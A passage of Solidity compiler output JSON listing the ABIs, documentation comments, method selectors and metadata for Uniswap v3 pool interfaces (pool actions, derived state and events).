								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							}
						},
						"title": "Permissionless pool actions"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
							"collect(address,int24,int24,uint128,uint128)": "4f1eb3d8",
							"flash(address,uint256,uint256,bytes)": "490e6cbc",
							"increaseObservationCardinalityNext(uint16)": "32148f67",
							"initialize(uint160)": "f637731d",
							"mint(address,int24,int24,uint128,bytes)": "3c8a7d8d",
							"swap(address,bool,int256,uint160,bytes)": "128acb08"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collect\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"flash\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"}],\"name\":\"increaseObservationCardinalityNext\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initialize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}}},\"title\":\"Permissionless pool actions\"},\"userdoc\":{\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"}},\"notice\":\"Contains pool methods that can be called by anyone\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":\"IUniswapV3PoolActions\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							}
						},
						"notice": "Contains pool methods that can be called by anyone"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"IUniswapV3PoolDerivedState": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint32[]",
									"name": "secondsAgos",
									"type": "uint32[]"
								}
							],
							"name": "observe",
							"outputs": [
								{
									"internalType": "int56[]",
									"name": "tickCumulatives",
									"type": "int56[]"
								},
								{
									"internalType": "uint160[]",
									"name": "secondsPerLiquidityCumulativeX128s",
									"type": "uint160[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								}
							],
							"name": "snapshotCumulativesInside",
							"outputs": [
								{
									"internalType": "int56",
									"name": "tickCumulativeInside",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityInsideX128",
									"type": "uint160"
								},
								{
									"internalType": "uint32",
									"name": "secondsInside",
									"type": "uint32"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"observe(uint32[])": {
								"details": "To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.",
								"params": {
									"secondsAgos": "From how long ago each cumulative tick and liquidity value should be returned"
								},
								"returns": {
									"secondsPerLiquidityCumulativeX128s": "Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp",
									"tickCumulatives": "Cumulative tick values as of each `secondsAgos` from the current block timestamp"
								}
							},
							"snapshotCumulativesInside(int24,int24)": {
								"details": "Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.",
								"params": {
									"tickLower": "The lower tick of the range",
									"tickUpper": "The upper tick of the range"
								},
								"returns": {
									"secondsInside": "The snapshot of seconds per liquidity for the range",
									"secondsPerLiquidityInsideX128": "The snapshot of seconds per liquidity for the range",
									"tickCumulativeInside": "The snapshot of the tick accumulator for the range"
								}
							}
						},
						"title": "Pool state that is not stored"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"observe(uint32[])": "883bdbfd",
							"snapshotCumulativesInside(int24,int24)": "a38807f2"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}}},\"title\":\"Pool state that is not stored\"},\"userdoc\":{\"methods\":{\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"}},\"notice\":\"Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs.\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":\"IUniswapV3PoolDerivedState\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							}
						},
						"notice": "Contains view functions to provide information about the pool that is computed rather than stored on the blockchain. The functions here may have variable gas costs."
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"IUniswapV3PoolEvents": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "Collect",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"name": "CollectProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "paid1",
									"type": "uint256"
								}
							],
							"name": "Flash",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextOld",
									"type": "uint16"
								},
								{
									"indexed": false,
									"internalType": "uint16",
									"name": "observationCardinalityNextNew",
									"type": "uint16"
								}
							],
							"name": "IncreaseObservationCardinalityNext",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Initialize",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"indexed": true,
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1Old",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol0New",
									"type": "uint8"
								},
								{
									"indexed": false,
									"internalType": "uint8",
									"name": "feeProtocol1New",
									"type": "uint8"
								}
							],
							"name": "SetFeeProtocol",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								},
								{
									"indexed": false,
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								},
								{
									"indexed": false,
									"internalType": "uint128",
									"name": "liquidity",
									"type": "uint128"
								},
								{
									"indexed": false,
									"internalType": "int24",
									"name": "tick",
									"type": "int24"
								}
							],
							"name": "Swap",
							"type": "event"
						}
					],
					"devdoc": {
						"methods": {},
						"title": "Events emitted by a pool"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {}
					},
